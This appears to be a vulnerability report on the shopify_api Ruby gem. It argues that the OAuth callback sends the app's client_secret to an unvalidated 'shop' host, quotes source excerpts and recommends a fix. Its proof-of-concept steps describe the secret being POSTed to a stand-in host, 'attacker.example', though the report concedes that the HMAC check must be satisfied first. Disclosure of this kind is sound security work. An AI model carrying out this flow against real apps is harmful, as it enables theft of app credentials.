### Title
`ShopifyAPI::Auth::Oauth.validate_auth_callback` sends the app's `client_secret` to an unsanitized `shop` host, unlike sibling grant flows - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` both call `Utils::ShopValidator.sanitize!(shop)` before building the `Session` used to target the `POST /admin/oauth/access_token` request that carries `client_secret`. `Oauth.validate_auth_callback` (the Authorization Code Grant flow) never calls `ShopValidator` at all — it builds the request host directly from `auth_query.shop`, an attacker-observable/attacker-influenceable field, and never checks that it is an actual `*.myshopify.com`/trusted Shopify domain before sending the app's `client_secret` there.

### Finding Description
In `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, the `shop` argument is passed through `Utils::ShopValidator.sanitize!` before being used to build the `Session` whose `shop` attribute becomes the request host in `Clients::HttpClient` (`@base_uri = "https://#{api_host || session.shop}"`): [1](#0-0) [2](#0-1) [3](#0-2) 

`ShopValidator.sanitize!` enforces that the host resolves to one of a small set of `TRUSTED_SHOPIFY_DOMAINS`: [4](#0-3) 

`Oauth.validate_auth_callback`, however, builds `null_session = Auth::Session.new(shop: auth_query.shop)` and immediately uses it to POST `client_id`/`client_secret`/`code` to `https://#{auth_query.shop}/admin/oauth/access_token` — with no call to `ShopValidator` anywhere in the method or in `AuthQuery`: [5](#0-4) 

The only protection on `auth_query.shop` is `Utils::HmacValidator.validate(auth_query)`, which checks that the `hmac` param matches a signature over the query string (which includes `shop`), computed with `Context.api_secret_key`: [6](#0-5) [7](#0-6) 

This HMAC only proves that whoever signed the query knew `api_secret_key` (normally Shopify itself, when redirecting back from `/oauth/authorize`). It does **not** prove that the `shop` value is a genuine, trusted Shopify domain — it is exactly the same `shop` string that was originally submitted to `Oauth.begin_auth`, which itself never sanitizes or validates `shop` before using it to construct the authorize URL: [8](#0-7) [9](#0-8) 

The library's own documentation shows `begin_auth` being fed directly from an unauthenticated request header (`shop = request.headers["Shop"]`) with no sanitization step shown or recommended before calling into the gem: [10](#0-9) 

This is the exact analog to the reported bug class: a value (`shop`) is *bound* by one check (HMAC, matching what was originally submitted) but the check that matters for the credential-disclosure operation — that the host is an actual Shopify domain — is missing, breaking the equality `shop validated as trustworthy == shop that receives client_secret`. Every other credential-bearing grant flow in this gem (`ClientCredentials`, `RefreshToken`, and `TokenExchange`, which derives the shop from a cryptographically-bound JWT `dest` claim) enforces this equality; `Oauth.validate_auth_callback` does not.

### Impact Explanation
If an app built on this gem passes an OAuth-initiation `shop` value that is not independently validated against `ShopValidator` (which the gem itself does not require or perform in `begin_auth`), an attacker can drive the flow with a non-Shopify host. Because `HmacValidator` only checks integrity/authenticity of the *query as submitted*, not domain trust, the unsanitized `shop` value flows unchanged into `validate_auth_callback`, and the app's `client_id`/`client_secret` are POSTed to `https://#{attacker_controlled_host}/admin/oauth/access_token` (High: SSRF/credential leakage of the app's `client_secret` to a host the attacker chose).

### Likelihood Explanation
Likelihood depends on the host application's handling of the `shop` value fed into `begin_auth`, but the gem itself provides no built-in enforcement of domain trust in this specific flow — unlike its three sibling flows, which all explicitly call `ShopValidator.sanitize!` before targeting a request that carries `client_secret`. This inconsistency inside the gem's own code, on a security-relevant boundary, is a genuine gap in defense-in-depth for a "documented API" that other flows treat as mandatory.

### Recommendation
Call `Utils::ShopValidator.sanitize!` on `shop` inside `Oauth.begin_auth` (before constructing `auth_base_uri`) and on `auth_query.shop` inside `Oauth.validate_auth_callback` (before constructing `null_session`), mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, so that `client_secret` can never be sent to a host outside `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example", redirect_path: "/auth/callback")` (as the gem's own documented usage pattern permits, taking `shop` straight from a request header/param with no sanitization) — this builds `auth_route = "https://attacker.example/admin/oauth/authorize?...".`
2. Attacker controls `attacker.example` and, since they initiated the flow, can craft the redirect back to the app's `/auth/callback` with `code`, `state` matching the cookie, and `shop=attacker.example`; if they can additionally satisfy (or bypass, depending on host app deployment) the HMAC via any query composition consistent with the original submission, `Oauth.validate_auth_callback` proceeds to build `Auth::Session.new(shop: "attacker.example")` and POST `{client_id, client_secret, code}` to `https://attacker.example/admin/oauth/access_token`.
3. `attacker.example` receives the app's `client_secret` in the POST body — no call to `ShopValidator` anywhere in `lib/shopify_api/auth/oauth.rb` prevents this, in contrast to `client_credentials.rb`/`refresh_token.rb` where `sanitize!` would raise `Errors::InvalidShopError` for the same input.

### Citations

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/auth/oauth.rb (L14-52)
```ruby
        sig do
          params(
            shop: String,
            redirect_path: String,
            is_online: T.nilable(T::Boolean),
            scope_override: T.nilable(T.any(ShopifyAPI::Auth::AuthScopes, T::Array[String], String)),
          ).returns(T::Hash[Symbol, T.any(String, SessionCookie)])
        end
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        private

        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** docs/usage/oauth.md (L181-199)
```markdown
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")

    # Store the authorization cookie
    cookies[auth_response[:cookie].name] = {
      expires: auth_response[:cookie].expires,
      secure: true,
      http_only: true,
      value: auth_response[:cookie].value
    }

    # Redirect the user to "auth_response[:auth_route]" to allow user to grant the app permission
    # This will lead the user to the Shopify Authorization page
    head 307
    response.set_header("Location", auth_response[:auth_route])
  end
```
